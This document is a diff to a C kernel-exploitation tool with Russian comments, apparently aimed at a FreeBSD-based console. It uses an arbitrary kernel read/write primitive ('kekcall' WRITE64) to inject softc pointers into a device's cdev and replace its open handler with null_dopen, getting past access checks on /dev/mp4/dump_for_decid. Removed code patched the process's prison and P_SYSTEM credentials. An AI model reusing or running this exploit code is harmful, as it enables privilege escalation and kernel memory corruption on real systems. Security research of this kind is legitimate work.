@@ -409,6 +409,11 @@ static uint64_t g_cand_authids[32];
 static uint64_t g_cand_ucreds[32];
 static char     g_cand_comms[32][32];
 
+static uint64_t g_cdev_deci_mp4_ioc = 0;
+static uint64_t g_cdev_deci_mp4_mmc = 0;
+static uint64_t g_cdev_deci_coredump = 0;
+static uint64_t g_cdev_mp4_dump_for_decid = 0;
+
 int
 scan_cdevsw(void)
 {
@@ -697,6 +702,11 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
                                 (unsigned long long)csw);
                 }
 
+                if (strcmp(dev_name, "deci_mp4_ioc") == 0) g_cdev_deci_mp4_ioc = cur_cdev;
+                if (strcmp(dev_name, "deci_mp4_mmc") == 0) g_cdev_deci_mp4_mmc = cur_cdev;
+                if (strcmp(dev_name, "deci_coredump") == 0) g_cdev_deci_coredump = cur_cdev;
+                if (strcmp(dev_name, "mp4/dump_for_decid") == 0) g_cdev_mp4_dump_for_decid = cur_cdev;
+
                 if (strncmp(dev_name, "mp4/", 4) == 0 || strstr(dev_name, "mp4")) {
                     klog_printf("[WALK] ****************************************************\n");
                     klog_printf("[WALK] *** TARGET MATCH: '%s' @ cdev=0x%llx parent_csw=0x%llx (%s) ***\n",
@@ -714,6 +724,7 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
                         mp4_count++;
                     }
                 }
+
             }
 
             /* Следующий cdev в списке (si_list.le_next на +0x60) */
@@ -1033,78 +1044,141 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
         klog_printf("[INPLACE_RESTORE] KEKCALL_RESTORE_INPLACE ret=%ld\n", rst_ret);
     }
 
+    /* ========================================================================= */
+    /* ШАГИ A, B, C, D: РАЗВЕДКА И ИНЪЕКЦИЯ SOFTC                                */
+    /* ========================================================================= */
+
+    uint64_t mp4_cdev_addr = g_cdev_mp4_dump_for_decid ? g_cdev_mp4_dump_for_decid : dedicated_mp4_cdev;
+
     /* ------------------------------------------------------------------------- */
-    /* ТЕСТ 2 — Prison test: KEKCALL 32 с флагом 1 (патчит cr_prison)            */
+    /* ШАГ A — Dump cdev трёх соседей (+0x60..+0x90)                             */
     /* ------------------------------------------------------------------------- */
-    klog_printf("[TEST2_START] === TEST 2: Prison test via KEKCALL 32 (flags=1) ===\n");
-    if (cand_prison_ptr && prison_offset) {
-        static uint64_t ptest_buf[128];
-        memset(ptest_buf, 0, sizeof(ptest_buf));
+    klog_printf("[STEP_A] === STEP A: Dump neighbour cdevs for softc discovery ===\n");
+    klog_printf("[STEP_A] targets: ioc=0x%llx mmc=0x%llx coredump=0x%llx mp4=0x%llx\n",
+                (unsigned long long)g_cdev_deci_mp4_ioc,
+                (unsigned long long)g_cdev_deci_mp4_mmc,
+                (unsigned long long)g_cdev_deci_coredump,
+                (unsigned long long)mp4_cdev_addr);
 
-        long pr_ret = kekcall(KEKCALL_DIFF_TEST, video_ucred, (uintptr_t)ptest_buf, 1 /* patch prison */);
-        uint64_t old_prison = ptest_buf[2];
-        klog_printf("[PRISON_SET] ret=%ld patched our_ucred+0x%x: old=0x%llx -> new=0x%llx\n",
-                    pr_ret, prison_offset, (unsigned long long)old_prison, (unsigned long long)cand_prison_ptr);
+    struct { const char *name; uint64_t addr; } neighbours[] = {
+        { "deci_mp4_ioc",  g_cdev_deci_mp4_ioc },
+        { "deci_mp4_mmc",  g_cdev_deci_mp4_mmc },
+        { "deci_coredump", g_cdev_deci_coredump },
+        { "mp4_dump_dec",  mp4_cdev_addr }
+    };
 
-        errno = 0;
-        int fd_p = open("/dev/mp4/dump_for_decid", O_RDWR);
-        int ep = errno;
-        if (fd_p < 0 && ep == 1) {
-            fd_p = open("/dev/mp4/dump_for_decid", O_RDONLY);
-            ep = errno;
+    uint64_t discovered_softc = 0;
+    uint32_t discovered_softc_off = 0;
+
+    for (int n = 0; n < 4; n++) {
+        if (!neighbours[n].addr) continue;
+        uint64_t nwords[8] = {0};
+        kekcall(KEKCALL_DUMP_MEM, neighbours[n].addr + 0x60ULL, (uintptr_t)nwords, 64);
+        klog_printf("[CDEV_%s +0x60..0x98]:\n", neighbours[n].name);
+        for (int i = 0; i < 8; i++) {
+            uint32_t off = 0x60 + i * 8;
+            uint64_t val = nwords[i];
+            klog_printf("  +0x%02x = 0x%016llx\n", off, (unsigned long long)val);
+
+            /* Шаг B: ищем non-NULL softc в диапазоне +0x68..+0x80 у открывающихся соседей */
+            if (n < 3 && (off == 0x70 || off == 0x78 || off == 0x80) && val != 0 && (val >> 48) == 0xffff) {
+                if (!discovered_softc) {
+                    discovered_softc = val;
+                    discovered_softc_off = off;
+                }
+            }
         }
-        klog_printf("[PRISON_OPEN] fd=%d errno=%d\n", fd_p, ep);
-
-        if (fd_p >= 0) {
-            klog_printf("[PRISON_OPEN] *** BINGO! SUCCESS OPEN WITH PRISON PATCH! fd=%d ***\n", fd_p);
-            uint8_t cmd[4] = {0x01, 0x00, 0x00, 0x00};
-            ssize_t nw = write(fd_p, cmd, 4);
-            klog_printf("[PRISON_WRITE] nw=%zd errno=%d\n", nw, errno);
-            close(fd_p);
-        }
-
-        /* Восстановление через KEKCALL 33 */
-        kekcall(KEKCALL_RESTORE_DIFF, (uint64_t)prison_offset, old_prison, 0);
-        klog_printf("[PRISON_RESTORE] restored prison successfully\n");
-    } else {
-        klog_printf("[PRISON_SKIP] no distinct prison pointer candidate found in diff\n");
     }
 
     /* ------------------------------------------------------------------------- */
-    /* ТЕСТ 3 — P_SYSTEM test: KEKCALL 32 с флагом 2 (патчит p_flag |= 0x200)    */
+    /* ШАГ B — Результат определения EXACT offset si_drv1                        */
     /* ------------------------------------------------------------------------- */
-    klog_printf("[TEST3_START] === TEST 3: P_SYSTEM flag test via KEKCALL 32 (flags=2) ===\n");
-    {
-        static uint64_t systest_buf[128];
-        memset(systest_buf, 0, sizeof(systest_buf));
+    klog_printf("[STEP_B] Discovered softc candidate: ptr=0x%llx at offset +0x%02x\n",
+                (unsigned long long)discovered_softc, discovered_softc_off);
 
-        long sys_ret = kekcall(KEKCALL_DIFF_TEST, video_ucred, (uintptr_t)systest_buf, 2 /* patch p_flag */);
-        uint64_t orig_pflag = systest_buf[4];
-        uint64_t new_pflag  = systest_buf[5];
-        klog_printf("[PSYSTEM_SET] ret=%ld p_flag: orig=0x%llx -> new=0x%llx\n",
-                    sys_ret, (unsigned long long)orig_pflag, (unsigned long long)new_pflag);
+    /* ------------------------------------------------------------------------- */
+    /* ШАГ C — Копировать softc в mp4 cdev + open via nullopen + write           */
+    /* ------------------------------------------------------------------------- */
+    if (mp4_cdev_addr && dedicated_mp4_csw && discovered_softc) {
+        klog_printf("[STEP_C] === STEP C: Injecting discovered softc into mp4 cdev ===\n");
+        uint32_t target_off = discovered_softc_off ? discovered_softc_off : 0x70;
 
-        errno = 0;
-        int fd_sys = open("/dev/mp4/dump_for_decid", O_RDWR);
-        int es = errno;
-        if (fd_sys < 0 && es == 1) {
-            fd_sys = open("/dev/mp4/dump_for_decid", O_RDONLY);
-            es = errno;
+        uint64_t orig_val = 0;
+        kekcall(KEKCALL_DUMP_MEM, mp4_cdev_addr + target_off, (uintptr_t)&orig_val, 8);
+        klog_printf("[STEP_C] mp4_cdev+0x%x orig=0x%llx -> inject=0x%llx\n",
+                    target_off, (unsigned long long)orig_val, (unsigned long long)discovered_softc);
+
+        /* Инъекция */
+        kekcall(27 /* WRITE64 */, mp4_cdev_addr + target_off, discovered_softc, 0);
+
+        /* Bypass open через null_dopen */
+        kekcall(27 /* WRITE64 */, dedicated_mp4_csw + 0x10ULL, null_dopen, 0);
+
+        int fd_c = open("/dev/mp4/dump_for_decid", O_RDWR);
+        int ec = errno;
+        klog_printf("[DECI_SOFTC_INJECT] open fd=%d errno=%d\n", fd_c, ec);
+
+        if (fd_c >= 0) {
+            ssize_t nw = write(fd_c, "\x01\x02\x03\x04", 4);
+            int we = errno;
+            uint8_t rdata[256] = {0};
+            ssize_t nr = read(fd_c, rdata, sizeof(rdata));
+            int re = errno;
+            klog_printf("[DECI_SOFTC_INJECT] write nw=%zd (errno=%d) read nr=%zd (errno=%d)\n", nw, we, nr, re);
+            if (nr > 0) {
+                klog_printf("[DECI_SOFTC_INJECT] *** DATA RETURNED: first_u32=0x%08x ***\n", *(uint32_t*)rdata);
+            }
+            close(fd_c);
         }
-        klog_printf("[PSYSTEM_OPEN] fd=%d errno=%d\n", fd_sys, es);
 
-        if (fd_sys >= 0) {
-            klog_printf("[PSYSTEM_OPEN] *** BINGO! SUCCESS OPEN WITH P_SYSTEM FLAG! fd=%d ***\n", fd_sys);
-            uint8_t cmd[4] = {0x01, 0x00, 0x00, 0x00};
-            ssize_t nw = write(fd_sys, cmd, 4);
-            klog_printf("[PSYSTEM_WRITE] nw=%zd errno=%d\n", nw, errno);
-            close(fd_sys);
-        }
-
-        /* Восстановление через KEKCALL 33 */
-        kekcall(KEKCALL_RESTORE_DIFF, 0, 0, orig_pflag);
-        klog_printf("[PSYSTEM_RESTORE] restored p_flag successfully\n");
+        /* Восстановление */
+        kekcall(27 /* WRITE64 */, mp4_cdev_addr + target_off, orig_val, 0);
+        kekcall(27 /* WRITE64 */, dedicated_mp4_csw + 0x10ULL, orig_dopen_calc, 0);
     }
+
+    /* ------------------------------------------------------------------------- */
+    /* ШАГ D — Fallback: Fake zeroed page injection                               */
+    /* ------------------------------------------------------------------------- */
+    if (mp4_cdev_addr && dedicated_mp4_csw) {
+        klog_printf("[STEP_D] === STEP D: Fake zeroed page softc injection ===\n");
+        static uint8_t fake_page[4096] __attribute__((aligned(4096)));
+        memset(fake_page, 0, sizeof(fake_page));
+
+        uint64_t fake_ptr = (uint64_t)fake_page;
+        uint32_t target_off = discovered_softc_off ? discovered_softc_off : 0x70;
+
+        uint64_t orig_val = 0;
+        kekcall(KEKCALL_DUMP_MEM, mp4_cdev_addr + target_off, (uintptr_t)&orig_val, 8);
+
+        kekcall(27 /* WRITE64 */, mp4_cdev_addr + target_off, fake_ptr, 0);
+        kekcall(27 /* WRITE64 */, dedicated_mp4_csw + 0x10ULL, null_dopen, 0);
+
+        int fd_d = open("/dev/mp4/dump_for_decid", O_RDWR);
+        int ed = errno;
+        klog_printf("[FAKE_SOFTC_INJECT] open fd=%d errno=%d\n", fd_d, ed);
+
+        if (fd_d >= 0) {
+            ssize_t nw = write(fd_d, "\x01\x00\x00\x00", 4);
+            int we = errno;
+            klog_printf("[FAKE_SOFTC_INJECT] write nw=%zd errno=%d\n", nw, we);
+
+            /* Dump нашего fake page ПОСЛЕ write */
+            klog_printf("[FAKE_AFTER_WRITE]:\n");
+            for (int i = 0; i < 128; i += 16) {
+                klog_printf("  +0x%02x: %02x %02x %02x %02x %02x %02x %02x %02x  %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                            i, fake_page[i], fake_page[i+1], fake_page[i+2], fake_page[i+3],
+                            fake_page[i+4], fake_page[i+5], fake_page[i+6], fake_page[i+7],
+                            fake_page[i+8], fake_page[i+9], fake_page[i+10], fake_page[i+11],
+                            fake_page[i+12], fake_page[i+13], fake_page[i+14], fake_page[i+15]);
+            }
+            close(fd_d);
+        }
+
+        /* Восстановление */
+        kekcall(27 /* WRITE64 */, mp4_cdev_addr + target_off, orig_val, 0);
+        kekcall(27 /* WRITE64 */, dedicated_mp4_csw + 0x10ULL, orig_dopen_calc, 0);
+    }
+
 
 
 
